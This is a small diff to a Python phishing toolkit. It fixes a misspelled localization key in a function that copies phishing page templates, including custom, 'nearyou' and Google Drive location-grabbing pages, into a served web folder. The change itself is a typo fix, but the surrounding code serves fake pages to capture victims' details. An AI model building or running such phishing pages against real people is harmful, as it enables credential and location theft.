@@ -340,7 +340,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     elif page == 'CUSTOM(2)':
         print(localization.lang_start_phishing_page["custom_folder_directory"].format(page = page))
         print(localization.lang_start_phishing_page["manual_reading_suggestion"].format(page = page))
-        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
+        input(localization.lang_start_phishing_page["press_enter_to_continue_if_setup_correctly"])
         print(localization.lang_start_phishing_page["copying_your_files"])
         wait(3)
         webpage_set('WebPages/CUSTOM(2)/', "Server/www/")
@@ -350,7 +350,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
         wait(3)
         webpage_set('WebPages/TOOLS/nearyou', "Server/www/")
         print(localization.lang_start_phishing_page["https_suggestion"])
-        input(localization.lang_start_phishing_page["press_enter_to_contunue_if_setup_correctly"])
+        input(localization.lang_start_phishing_page["press_enter_to_continue_if_setup_correctly"])
     elif custom_option == '2' and page == 'LOCATION':
         wait(3)
         webpage_set('WebPages/TOOLS/gdrive', "Server/www/")
